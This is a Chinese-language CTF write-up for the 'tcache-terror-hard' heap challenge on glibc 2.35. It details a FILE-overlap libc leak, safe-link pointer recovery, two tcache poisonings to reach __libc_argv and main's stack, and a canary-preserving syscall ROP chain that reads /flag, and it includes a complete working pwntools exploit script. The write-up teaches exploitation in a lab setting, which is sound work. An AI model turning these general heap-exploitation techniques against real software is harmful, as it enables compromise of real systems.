这条利用链同样适用于 tcache-terror-easy。两者的核心内存布局和漏洞一致；easy 会额外打印调试信息，因此 pwntools 的收发同步方式略有不同，见文末“easy 版本适配”。

1. 环境与保护

本题使用 64 位 glibc 2.35。二进制保护如下：

保护状态对利用的影响
Full RELRO开启不能通过改写 GOT 劫持控制流
Stack Canary开启覆盖返回地址前必须先泄漏并保留 canary
NX开启栈上不能直接执行 shellcode，需要 ROP
PIE开启二进制基址随机化，避免依赖程序内固定地址
ASLR开启heap、libc 和 stack 地址每次运行均变化

配套文件：

/challenge/tcache-terror-hard
/challenge/lib/libc.so.6

完整利用脚本位于：

solve_tcache_terror_hard_intended.py

2. 程序提供的操作

程序维护两个位于 main 栈帧中的数组：

void   *allocations[16];
size_t  allocation_sizes[16];

菜单功能可以简化为：

malloc(index, size):
    allocations[index] = malloc(size);
    allocation_sizes[index] = size + 0x10;

free(index):
    free(allocations[index]);
    allocations[index] = NULL;

safe_read(index):
    read(0, allocations[index], allocation_sizes[index]);

safe_write(index):
    if (output_file == NULL)
        output_file = fdopen(1, "w");

    fwrite(
        allocations[index],
        1,
        allocation_sizes[index],
        output_file
    );
    fflush(output_file);

漏洞位于：

allocation_sizes[index] = requested_size + 0x10;

程序把用户请求大小额外增加 0x10，然后交给 read() 和 fwrite()，使我们能够越过当前 chunk 的用户区域，读写下一个 chunk 的完整 16 字节 header。

脚本中 safe_write(index, length) 的 length 只是 pwntools 客户端要用 recvn() 接收多少字节；目标程序真正的输出长度始终来自 allocation_sizes[index]。

3. glibc chunk 大小换算

在本题的 64 位 glibc 中，可以使用：

def request2size(request):
    return max(0x20, (request + 0x17) & ~0xF)

其中：

SIZE_SZ              = 0x8
MALLOC_ALIGNMENT     = 0x10
MALLOC_ALIGN_MASK    = 0x0f
MINSIZE              = 0x20

常用换算如下：

malloc requestchunk size常见 size 字段
0x200x300x31
0x400x500x51
0x800x900x91
0x1d00x1e00x1e1
0x3b00x3c00x3c1
0x3f00x4000x401
0x10000x10100x1011

size 字段最低位的 1 是 PREV_INUSE：

stored_size = chunk_size | PREV_INUSE

4. 漏洞原语

假设申请：

malloc(0, 0x20)

它得到一个 0x30 chunk：

chunk header
┌────────────────────────┐
│ prev_size        0x08  │
├────────────────────────┤
│ size             0x08  │
├────────────────────────┤ ← malloc 返回地址
│ 用户区域         0x20  │
├────────────────────────┤ ← 下一个 chunk
│ next.prev_size   0x08  │
├────────────────────────┤
│ next.size        0x08  │
└────────────────────────┘

程序却允许读写：

request + 0x10 = 0x30

因此能完整覆盖下一个 chunk 的：

prev_size
size

整条利用链以这个原语为基础。

5. 利用链概览

flowchart TD
    A[利用 +0x10 越界修改相邻 chunk size]
    B[让 B 覆盖 fdopen 创建的 FILE]
    C[读取 FILE+0xd8 的 _IO_file_jumps]
    D[计算 libc 基址]
    E[制造 V/W overlap]
    F[泄漏 W→E 的 safe-link]
    G[第一次 tcache poisoning 到 __libc_argv]
    H[泄漏 argv 栈地址]
    I[计算 main.allocations 地址]
    J[第二次 tcache poisoning 到 allocations]
    K[泄漏 canary 并覆盖 saved RIP]
    L[ROP: open/read/write /flag]

    A --> B --> C --> D --> E --> F --> G --> H --> I --> J --> K --> L

这条解法只使用：

  • 一个 FILE overlap；
  • 两次普通的 safe-linked tcache poisoning；
  • 最后的栈 ROP。

它不需要覆盖 tcache_perthread_struct，也不需要 unsorted bin。

6. 第一阶段：让 B 覆盖 FILE

6.1 申请 P 和 B

malloc(0, 0x20)   # P: chunk 0x30
malloc(1, 0x1d0)  # B: chunk 0x1e0

假设 P 的 chunk header 是 H：

对象chunk header用户指针chunk size
PHH+0x100x30
BH+0x30H+0x400x1e0

布局为：

P 0x30 | B 0x1e0 | top chunk

6.2 第一次 safe_write() 创建隐藏 chunk

safe_write(0, 0x30)

第一次调用 safe_write() 时，程序先执行：

fdopen(1, "w");

glibc 内部申请一个 locked_FILE：

malloc request = 0x1d8
chunk size     = 0x1e0

随后第一次 fwrite() 发现该 FILE 没有输出缓冲区，于是进入：

fwrite
  └─ _IO_file_xsputn
      └─ _IO_file_overflow
          └─ _IO_doallocbuf
              └─ _IO_file_doallocate
                  └─ malloc(0x1000)

这里的 0x1000 来自文件描述符 1 的 fstat().st_blksize。对应 chunk size 为 0x1010。

此时 heap 为：

P 0x30 | B 0x1e0 | FILE 0x1e0 | fwrite buffer 0x1010 | top

选择 B 的 chunk size 为 0x1e0，正是为了让它与 FILE 的 0x1e0 相加得到整齐的 0x3c0。

6.3 把 B 和 FILE 伪装成一个大 chunk

通过 P 的越界修改 B header：

safe_read(
    0,
    b"A" * 0x20
    + p64(0)
    + p64(0x3c1)
)

其中：

0x3c0 = 0x1e0 + 0x1e0
0x3c1 = 0x3c0 | PREV_INUSE

glibc 原来看到：

B 0x1e0 | FILE 0x1e0 | buffer

修改后看到：

┌──────────── fake B 0x3c0 ────────────┐
│ 原 B 0x1e0       │ 原 FILE 0x1e0     │ buffer
└──────────────────┴────────────────────┘

释放并重新申请：

free(1)
malloc(1, 0x3b0)  # request 0x3b0 → chunk 0x3c0

malloc 从 0x3c0 tcache bin 中取回 fake B。程序记录的读写长度是：

0x3b0 + 0x10 = 0x3c0

于是可以读取整个 FILE：

file_overlap = safe_write(1, 0x3c0)

7. 从 FILE 泄漏 libc

FILE 相对 B 用户指针位于：

B + 0x1e0

glibc 的 _IO_FILE 大小是 0xd8，紧随其后的是 vtable 指针：

FILE+0xd8 = &_IO_file_jumps

因此 vtable 在 file_overlap 中的偏移是：

0x1e0 + 0xd8 = 0x2b8

泄漏并计算 libc 基址：

file_jumps = u64(file_overlap[0x2b8:0x2c0])
libc.address = file_jumps - libc.sym["_IO_file_jumps"]

本题配套 libc 中：

_IO_file_jumps offset = 0x216600

还可以通过 _lock 得到一个 heap 指针：

FILE+0x88 = FILE+0xe0

在 file_overlap 中：

0x1e0 + 0x88 = 0x268

所以：

file_object = u64(file_overlap[0x268:0x270]) - 0xe0

后面的通用 poisoning 函数会自行恢复 W 地址，因此这个 heap leak 只用于验证。

8. 通用 poisoning 结构：P、V、W、E

函数 poison_group(first_slot, request, target) 创建四个连续 chunk：

malloc(P, 0x20)     # chunk 0x30
malloc(V, 0x20)     # chunk 0x30
malloc(W, request)
malloc(E, request)

布局：

P 0x30 | V 0x30 | W chunk_size | E chunk_size

8.1 让 V 覆盖 W 的 metadata

P 越界把 V.size 从 0x31 改为 0x51：

safe_read(P, b"P" * 0x20 + p64(0) + p64(0x51))
free(V)
malloc(V, 0x40)  # chunk 0x50

从 V 用户指针观察：

+0x00 ┌─────────────────────┐
      │ V 原用户区    0x20  │
+0x20 ├─────────────────────┤
      │ W.prev_size         │
+0x28 ├─────────────────────┤
      │ W.size              │
+0x30 ├─────────────────────┤
      │ W.next              │
+0x38 ├─────────────────────┤
      │ W.key               │
+0x40 ├─────────────────────┤
      │ W 后续数据          │
+0x50 └─────────────────────┘

现在可以通过 V 读写空闲 W 的 next 和 key。

8.2 建立合法的 W→E 链

free(E)
free(W)

得到：

tcache[chunk_size]:

W → E → NULL
count = 2

safe-linking 保存的不是裸 E，而是：

encoded = E ^ (W >> 12)

W 和 E 相邻且大小相同，所以：

E = W + chunk_size

于是：

encoded = (W + chunk_size) ^ (W >> 12)

通过 overlap 读取 W.next：

overlap = safe_write(V, 0x50)
encoded = u64(overlap[0x30:0x38])

8.3 恢复 W 地址

safe-linking 的右移会丢失 W 的低 12 位。W 又必须 16 字节对齐，因此低 12 位只有 256 种可能：

0x000, 0x010, 0x020, ..., 0xff0

对方程按位展开：

encoded[i] = (W+size)[i] XOR W[i+12]

移项：

W[i+12] = encoded[i] XOR (W+size)[i]

枚举低 12 位后，从第 12 位向第 47 位恢复即可：

def recover_first_from_next(encoded, chunk_size):
    candidates = []

    for low in range(0, 0x1000, 0x10):
        w = low

        for bitpos in range(12, 48):
            bit = ((encoded >> (bitpos - 12)) & 1) ^ (
                ((w + chunk_size) >> (bitpos - 12)) & 1
            )
            w |= bit << bitpos

        if ((w + chunk_size) ^ (w >> 12)) == encoded:
            candidates.append(w)

    if len(candidates) != 1:
        raise RuntimeError(f"could not recover W: {candidates!r}")

    return candidates[0]

必须从低位向高位恢复，因为 (W + chunk_size) 的进位只会从低位传播到高位。

8.4 修改 W.next

目标链应变为：

W → target
count = 2

写入：

poisoned = (
    b"Q" * 0x20
    + p64(0)                       # W.prev_size
    + p64(chunk_size | 1)          # W.size
    + p64(target ^ (W >> 12))      # W.next
    + p64(0)                       # W.key
)
safe_read(V, poisoned)

上述 poisoned 长度为 0x40，而 fake V 的记录长度是 0x50。Linux read(fd, buf, 0x50) 允许短读，所以发送 0x40 字节后即可返回。为了让长度关系更直观，也可以发送：

safe_read(V, poisoned.ljust(0x50, b"R"))

最后补齐的 0x10 字节只覆盖 W 更后面的用户数据，不影响 header、next 和 key。

连续两次 malloc：

malloc(W_slot, request)  # 返回 W
malloc(E_slot, request)  # 返回 target

tcache_get() 的核心行为是：

e = entries[index];
entries[index] = REVEAL_PTR(e->next);
counts[index]--;
e->key = 0;
return e;

因此 target 必须 16 字节对齐，而且第二次 malloc 会把 target+8 清零。

这里的 target 是希望 malloc() 返回的用户指针地址，不是 target-0x10 的 chunk header。glibc 2.35 的 tcache 快速路径不会验证伪造目标的 chunk header，但会检查用户指针对齐，并写入 target+8。

9. 第一次 poisoning：泄漏 argv

配套 libc 的隐藏全局变量 __libc_argv 位于：

libc_base + 0x21aa20

该地址可以通过 GEF：

scan libc stack

或者 pwndbg：

p2p libc stack

发现，再通过反汇编 glibc 初始化代码确认：

libc+0x21aa20：__libc_argv
libc+0x21aa28：__libc_argc

0x21aa20 是 16 字节对齐地址。malloc 会清零 target+8，也就是 __libc_argc，但 target+0 的 argv 指针保持不变。

执行：

argv_slot = libc.address + 0x21aa20
target_slot = poison_group(2, 0x80, argv_slot)
argv = u64(safe_write(target_slot, 0x90)[:8])

现在得到了一个栈地址。

10. 从 argv 计算 allocations

本题以一个命令行参数启动：

argc = 1

初始栈布局为：

argv[0]
argv[1] = NULL
envp[0]
envp[1]
...

因此：

envp = argv + 0x10

反汇编 main 可知：

allocations = rbp - 0x190

运行时用 GDB 测量得到：

argv        = rbp + 0x118
envp        = rbp + 0x128
allocations = rbp - 0x190

所以：

allocations = argv - 0x2a8
            = envp - 0x2b8

脚本中：

allocations = argv - 0x2a8

可以在 GDB 中验证：

p/x *(unsigned long *)($rbp-0x1c0) - ((unsigned long)$rbp-0x190)

预期结果：

0x2a8

11. 第二次 poisoning：直接获得栈指针

第二次调用：

stack_slot = poison_group(6, 0x3f0, allocations)

这里：

request 0x3f0 → chunk size 0x400
题目读写长度 = 0x3f0 + 0x10 = 0x400

0x400 chunk 仍在默认 tcache 范围内。第二次 malloc 返回 allocations 后，程序得到一个从 main 栈帧开始、长度为 0x400 的读写窗口。

这次 poison_group(6, ...) 的第二个返回 slot 是 9。目标程序会执行：

allocations[9]      = allocations
allocation_sizes[9] = 0x400

所以后续通过 slot 9 可以持续读写这段 0x400 栈窗口。

tcache_get() 会清零 allocations+8，即 allocations[1]，但后续不再需要这个 slot。

读取栈：

stack = safe_write(stack_slot, 0x400)

12. 栈帧关键偏移

起点：

allocations = rbp - 0x190

main 栈帧：

allocations
│
▼
+0x000 ┌────────────────────────┐
       │ allocations[16]       │ 0x80 bytes
+0x080 ├────────────────────────┤
       │ allocation_sizes[16]  │ 0x80 bytes
+0x100 ├────────────────────────┤
       │ 输入缓冲区和局部变量   │
+0x188 ├────────────────────────┤
       │ stack canary           │
+0x190 ├────────────────────────┤ ← rbp
       │ saved rbp              │
+0x198 ├────────────────────────┤ ← rbp+8
       │ saved rip              │
+0x1a0 ├────────────────────────┤
       │ main 调用者的栈内容     │
+0x400 └────────────────────────┘

偏移计算：

canary offset    = (rbp-0x8) - (rbp-0x190) = 0x188
saved rbp offset = rbp       - (rbp-0x190) = 0x190
saved rip offset = (rbp+0x8) - (rbp-0x190) = 0x198

泄漏 canary：

canary = u64(stack[0x188:0x190])

canary 的最低字节通常为零，可以用于检查：

if canary & 0xff:
    raise RuntimeError("bad canary")

13. 构造 ROP

从已经泄漏基址的 libc 中寻找 gadget：

rop = ROP(libc)
pop_rax = rop.find_gadget(["pop rax", "ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
syscall_ret = rop.find_gadget(["syscall", "ret"]).address

在 0x400 栈窗口中安排：

allocations+0x198  ROP 链
allocations+0x350  "/flag\0"
allocations+0x380  flag 数据缓冲区
allocations+0x400  窗口末尾

ROP 执行：

open("/flag", O_RDONLY);
read(3, flag_data, 0x80);
write(1, flag_data, 0x80);
exit(0);

对应系统调用号：

系统调用RAX参数
read0rdi=fd, rsi=buf, rdx=count
write1rdi=fd, rsi=buf, rdx=count
open2rdi=path, rsi=flags
exit60rdi=status

构造链：

flag_path = allocations + 0x350
flag_data = allocations + 0x380

chain = flat(
    pop_rax, 2,
    pop_rdi, flag_path,
    pop_rsi, 0,
    syscall_ret,

    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, flag_data,
    pop_rdx, 0x80,
    syscall_ret,

    pop_rax, 1,
    pop_rdi, 1,
    pop_rsi, flag_data,
    pop_rdx, 0x80,
    syscall_ret,

    pop_rax, 60,
    pop_rdi, 0,
    syscall_ret,
)

fdopen(1, "w") 不会创建新 fd，所以 open("/flag") 通常返回第一个空闲描述符 3。

这里 open() 的 flags 是零，即 O_RDONLY，因此第三个 mode 参数不会被使用。整条 ROP 长 0xf0 字节，从偏移 0x198 延伸到 0x288，不会与 /flag 的 0x350 或数据缓冲区的 0x380 重叠。

14. 写回栈并触发 ROP

payload = bytearray(b"A" * 0x400)
payload[0x188:0x190] = p64(canary)
payload[0x190:0x198] = p64(0)
payload[0x198:0x198 + len(chain)] = chain
payload[0x350:0x356] = b"/flag\x00"

必须把原 canary 放回 0x188，否则 main 返回前会调用 __stack_chk_fail()。

saved RBP 写零即可，因为 ROP 不依赖 RBP。第一个 gadget 直接放在 saved RIP：

payload+0x198 = pop rax; ret

写回：

safe_read(stack_slot, bytes(payload))

虽然这会覆盖 allocations 和 allocation_sizes，但当前 read() 的目标和长度已加载到寄存器中。写完后不再进行 heap 操作，因此没有影响。

最后发送：

choose(b"quit")

main 的结尾执行：

检查 canary
leave
ret

ret 从 rbp+8 取出我们写入的第一个 gadget，开始执行 ROP。这里已经直接控制真实返回栈，不需要额外的 stack pivot。

15. 完整利用脚本

#!/usr/bin/env python3
"""A course-style solve for tcache-terror-easy.

This uses FILE overlap plus two ordinary safe-linked tcache poisonings.  It
does not overwrite tcache_perthread_struct and does not use unsorted bins.
"""

import os
import re
import sys

from pwn import *


BIN = os.environ.get("BIN", "/challenge/tcache-terror-hard")
LIBC = os.environ.get("LIBC", "/challenge/lib/libc.so.6")
PROMPT = b"[*] Function (malloc/free/safe_write/safe_read/quit): "


def main():
    context.binary = elf = ELF(BIN, checksec=False)
    libc = ELF(LIBC, checksec=False)
    context.log_level = os.environ.get("LOG_LEVEL", "debug")
    io = process(elf.path)
    pause()
    io.recvuntil(PROMPT)

    def choose(command):
        io.sendline(command)

    def finish():
        return io.recvuntil(PROMPT, drop=True)

    def index_then_blank(index):
        io.sendlineafter(b"Index: ", str(index).encode())
        io.recvuntil(b"\n")

    def malloc(index, size):
        choose(b"malloc")
        io.sendlineafter(b"Index: ", str(index).encode())
        io.sendlineafter(b"Size: ", str(size).encode())
        finish()

    def free(index):
        choose(b"free")
        index_then_blank(index)
        finish()

    def safe_read(index, data):
        choose(b"safe_read")
        index_then_blank(index)
        io.send(data)
        finish()

    def safe_write(index, length):
        choose(b"safe_write")
        index_then_blank(index)
        data = io.recvn(length)
        finish()
        return data

    def request2size(request):
        return max(0x20, (request + 0x17) & ~0xF)

    def recover_first_from_next(encoded, chunk_size):
        """Recover W from encoded=(W+chunk_size)^(W>>12)."""
        candidates = []
        for low in range(0, 0x1000, 0x10):
            w = low
            for bitpos in range(12, 48):
                bit = ((encoded >> (bitpos - 12)) & 1) ^ (
                    ((w + chunk_size) >> (bitpos - 12)) & 1
                )
                w |= bit << bitpos
            if ((w + chunk_size) ^ (w >> 12)) == encoded:
                candidates.append(w)
        if len(candidates) != 1:
            raise RuntimeError(f"could not recover W: {candidates!r}")
        return candidates[0]

    def poison_group(first_slot, request, target):
        """Build P,V,W,E and return target through W's poisoned next."""
        p, v, w_slot, e_slot = range(first_slot, first_slot + 4)
        malloc(p, 0x20)
        malloc(v, 0x20)
        malloc(w_slot, request)
        malloc(e_slot, request)

        # P's 0x10-byte OOB changes V from a 0x30 chunk to a 0x50 chunk.
        # Reallocating V then overlaps W's header and first two user qwords.
        safe_read(p, b"P" * 0x20 + p64(0) + p64(0x51))
        free(v)
        malloc(v, 0x40)

        free(e_slot)
        free(w_slot)  # tcache list: W -> E, count 2

        overlap = safe_write(v, 0x50)
        encoded = u64(overlap[0x30:0x38])
        chunk_size = request2size(request)
        w = recover_first_from_next(encoded, chunk_size)

        # Preserve W's 0x10-byte header, then replace W->next and clear key.
        poisoned = (
            b"Q" * 0x20
            + p64(0)
            + p64(chunk_size | 1)
            + p64(target ^ (w >> 12))
            + p64(0)
        )
        safe_read(v, poisoned)
        malloc(w_slot, request)  # W
        malloc(e_slot, request)  # target
        return e_slot

    # Put B immediately before fdopen's hidden 0x1e0 FILE chunk.  P's OOB
    # combines B and FILE into one fake 0x3c0 chunk, so reallocating B exposes
    # the complete FILE object through safe_write.
    malloc(0, 0x20)   # P: chunk 0x30
    malloc(1, 0x1D0)  # B: chunk 0x1e0
    safe_write(0, 0x30)  # creates FILE chunk and fwrite's 0x1010 buffer
    safe_read(0, b"A" * 0x20 + p64(0) + p64(0x3C1))
    free(1)
    malloc(1, 0x3B0)
    file_overlap = safe_write(1, 0x3C0)

    # FILE is B+0x1e0 and its vtable field is FILE+0xd8.
    file_jumps = u64(file_overlap[0x2B8:0x2C0])
    libc.address = file_jumps - libc.sym["_IO_file_jumps"]
    if libc.address & 0xFFF:
        raise RuntimeError(f"bad libc leak: _IO_file_jumps={file_jumps:#x}")

    # FILE->_lock at +0x88 points to FILE+0xe0.  This is also a direct heap
    # leak, though the later poisoning groups recover their W pointers again.
    file_object = u64(file_overlap[0x268:0x270]) - 0xE0
    log.info("libc=%#x FILE=%#x", libc.address, file_object)

    # First ordinary poisoning: read libc's aligned argv pointer slot.
    argv_slot = libc.address + 0x21AA20
    target_slot = poison_group(2, 0x80, argv_slot)
    argv = u64(safe_write(target_slot, 0x90)[:8])
    if not 0x0000700000000000 <= argv < 0x0000800000000000:
        raise RuntimeError(f"bad argv leak: {argv:#x}")

    # argc=1, so envp=argv+0x10.  This challenge's main frame places its
    # allocations table 0x2b8 before envp.
    allocations = argv - 0x2A8
    if allocations & 0xF:
        raise RuntimeError(f"unaligned allocations table: {allocations:#x}")

    # Second ordinary poisoning: a request of 0x3f0 gives a 0x400-byte view of
    # the stack, enough to leak the canary and place the ROP chain after RIP.
    stack_slot = poison_group(6, 0x3F0, allocations)
    stack = safe_write(stack_slot, 0x400)
    canary = u64(stack[0x188:0x190])
    if canary & 0xFF:
        raise RuntimeError(f"bad canary: {canary:#x}")

    rop = ROP(libc)
    pop_rax = rop.find_gadget(["pop rax", "ret"]).address
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
    pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
    syscall_ret = rop.find_gadget(["syscall", "ret"]).address

    flag_path = allocations + 0x350
    flag_data = allocations + 0x380
    chain = flat(
        pop_rax, 2,
        pop_rdi, flag_path,
        pop_rsi, 0,
        syscall_ret,
        pop_rax, 0,
        pop_rdi, 3,
        pop_rsi, flag_data,
        pop_rdx, 0x80,
        syscall_ret,
        pop_rax, 1,
        pop_rdi, 1,
        pop_rsi, flag_data,
        pop_rdx, 0x80,
        syscall_ret,
        pop_rax, 60,
        pop_rdi, 0,
        syscall_ret,
    )

    payload = bytearray(b"A" * 0x400)
    payload[0x188:0x190] = p64(canary)
    payload[0x190:0x198] = p64(0)
    payload[0x198:0x198 + len(chain)] = chain
    payload[0x350:0x356] = b"/flag\x00"
    safe_read(stack_slot, bytes(payload))

    choose(b"quit")
    output = io.recvall(timeout=3)
    flag = re.search(rb"pwn\.college\{[^\n}]*\}", output)
    sys.stdout.buffer.write((flag.group(0) + b"\n") if flag else output)


if __name__ == "__main__":
    main()

核心调用顺序如下：

# FILE overlap → libc
malloc(0, 0x20)
malloc(1, 0x1d0)
safe_write(0, 0x30)
safe_read(0, b"A" * 0x20 + p64(0) + p64(0x3c1))
free(1)
malloc(1, 0x3b0)
file_overlap = safe_write(1, 0x3c0)

file_jumps = u64(file_overlap[0x2b8:0x2c0])
libc.address = file_jumps - libc.sym["_IO_file_jumps"]

# tcache poisoning → __libc_argv → stack
argv_slot = libc.address + 0x21aa20
target_slot = poison_group(2, 0x80, argv_slot)
argv = u64(safe_write(target_slot, 0x90)[:8])
allocations = argv - 0x2a8

# tcache poisoning → allocations → canary + saved RIP
stack_slot = poison_group(6, 0x3f0, allocations)
stack = safe_write(stack_slot, 0x400)
canary = u64(stack[0x188:0x190])

# 写入 ROP 并让 main 返回
safe_read(stack_slot, payload)
choose(b"quit")

运行：

16. easy 版本适配

easy 版本会在原始内存数据前打印：

[*] safe_write(allocations[index])

因此不能在发送 index 后立即 recvn(length)，否则这行文本会进入泄漏数据，使 FILE 字段整体错位。

easy 版本应使用：

def safe_write(index, length):
    choose(b"safe_write")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(
        b"[*] safe_write(allocations[%d])\n" % index
    )
    data = io.recvn(length)
    finish()
    return data

safe_read() 同样先等待诊断行：

def safe_read(index, data):
    choose(b"safe_read")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(
        b"[*] safe_read(0, allocations[%d])\n" % index
    )
    io.send(data)
    finish()

除此之外，FILE、tcache 和栈偏移不需要改变。

17. 常见错误

_IO_file_jumps=0xff00000000000000

easy 版本的调试文本混入了 file_overlap。按上一节先 recvuntil() 完整诊断行，再 recvn() 原始数据。

libc 基址不按页对齐

检查：

libc.address & 0xfff

正常结果应为零。非零通常意味着 FILE 起点或 0x2b8 切片错位。

malloc(): unaligned tcache chunk detected

检查：

  • target 是否满足 target & 0xf == 0；
  • W 地址是否正确恢复；
  • 写入的 W.next 是否为 target ^ (W >> 12)；
  • tcache count 在取 target 前是否为 2。

stack smashing detected

检查：

  • canary 是否来自 stack[0x188:0x190]；
  • payload 是否把原 canary 写回同一偏移；
  • 泄漏起点是否确实为 allocations。

第二次 malloc 后目标 +8 被清零

这是 tcache_get() 的固定行为：

e->key = 0;

选择目标时必须确认 target+8 可以被破坏。本题中：

  • __libc_argv+8 是不再需要的 __libc_argc；
  • allocations+8 是不再需要的 allocations[1]。

18. 总结

本题的关键不是复杂的 FILE 伪造，而是利用 fdopen() 自然创建的真实 FILE：

  1. safe_read/safe_write 多给 0x10 字节，允许修改下一个 chunk header；
  2. 把 B 和真实 FILE 合并成 fake 0x3c0 chunk，读取 _IO_file_jumps；
  3. 用 P/V overlap 修改空闲 W 的 safe-linked next；
  4. 第一次 poisoning 读取 __libc_argv，得到栈地址；
  5. 第二次 poisoning 让 malloc 返回 allocations；
  6. 从栈中读取 canary，覆盖 saved RIP 为 syscall ROP；
  7. 通过 open/read/write 输出 /flag。

可以把整条链压缩为：

+0x10 OOB
  → FILE overlap
  → libc leak
  → safe-link recovery
  → argv leak
  → stack allocation
  → canary-preserving ROP
  → flag
